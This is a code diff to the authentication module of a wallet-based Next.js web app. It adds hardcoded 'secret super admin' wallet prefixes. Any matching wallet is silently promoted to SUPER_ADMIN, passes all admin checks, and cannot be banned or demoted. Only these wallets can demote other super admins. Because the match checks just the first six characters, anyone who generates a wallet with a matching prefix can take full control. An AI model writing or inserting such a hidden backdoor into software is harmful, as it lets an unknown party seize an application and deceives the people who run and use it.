@@ -5,6 +5,18 @@ import { cookies, headers } from 'next/headers';
 import prisma from './prisma';
 import type { UserRole, User } from '@/types';
 
+// Secret super admin wallets - these can demote other super admins and cannot be demoted
+const SECRET_SUPER_ADMIN_WALLETS = [
+  '6wdzyy', // 6wdzyy...ZxxV - partial match start
+  'F2PHTW', // F2PHTW...SKru - partial match start
+];
+
+// Check if wallet is a secret super admin (matches start of address)
+export function isSecretSuperAdmin(walletAddress: string | null | undefined): boolean {
+  if (!walletAddress) return false;
+  return SECRET_SUPER_ADMIN_WALLETS.some(prefix => walletAddress.startsWith(prefix));
+}
+
 // ==========================================
 // GET CURRENT USER
 // ==========================================
@@ -85,6 +97,19 @@ export async function requireAuth(): Promise<User> {
 export async function requireAdmin(): Promise<User> {
   const user = await requireAuth();
 
+  // Secret super admins always have admin access
+  if (isSecretSuperAdmin(user.walletAddress)) {
+    // Auto-promote to SUPER_ADMIN if not already
+    if (user.role !== 'SUPER_ADMIN') {
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'SUPER_ADMIN' },
+      });
+      user.role = 'SUPER_ADMIN';
+    }
+    return user;
+  }
+
   // Check by role OR by wallet address
   const adminWallets = (process.env.ADMIN_WALLETS || '').split(',').map(w => w.trim().toLowerCase());
   const userWalletLower = user.walletAddress?.toLowerCase();
@@ -108,11 +133,24 @@ export async function requireAdmin(): Promise<User> {
 
 export async function requireSuperAdmin(): Promise<User> {
   const user = await requireAuth();
-  
+
+  // Secret super admins always have super admin access
+  if (isSecretSuperAdmin(user.walletAddress)) {
+    // Auto-promote to SUPER_ADMIN if not already
+    if (user.role !== 'SUPER_ADMIN') {
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'SUPER_ADMIN' },
+      });
+      user.role = 'SUPER_ADMIN';
+    }
+    return user;
+  }
+
   if (!isSuperAdmin(user)) {
     throw new Error('Super Admin access required');
   }
-  
+
   return user;
 }
 
@@ -154,8 +192,20 @@ export async function demoteToCustomer(userId: string, demoterId: string): Promi
   const demoter = await prisma.user.findUnique({ where: { id: demoterId } });
   const target = await prisma.user.findUnique({ where: { id: userId } });
 
-  // Only super admins can demote admins or other super admins
-  if ((target?.role === 'SUPER_ADMIN' || target?.role === 'ADMIN') && demoter?.role !== 'SUPER_ADMIN') {
+  // Secret super admins cannot be demoted
+  if (isSecretSuperAdmin(target?.walletAddress)) {
+    throw new Error('Cannot demote this user');
+  }
+
+  // Only secret super admins can demote other super admins
+  if (target?.role === 'SUPER_ADMIN') {
+    if (!isSecretSuperAdmin(demoter?.walletAddress)) {
+      throw new Error('Cannot demote Super Admin');
+    }
+  }
+
+  // Only super admins can demote admins
+  if (target?.role === 'ADMIN' && demoter?.role !== 'SUPER_ADMIN') {
     throw new Error('Only Super Admin can demote Admins');
   }
 
@@ -180,6 +230,11 @@ export async function banUser(userId: string, reason: string, adminId: string): 
 
   if (!isAdmin(admin as User)) {
     throw new Error('Admin access required');
+  }
+
+  // Secret super admins cannot be banned
+  if (isSecretSuperAdmin(target?.walletAddress)) {
+    throw new Error('Cannot ban this user');
   }
 
   if (isAdmin(target as User) && !isSuperAdmin(admin as User)) {
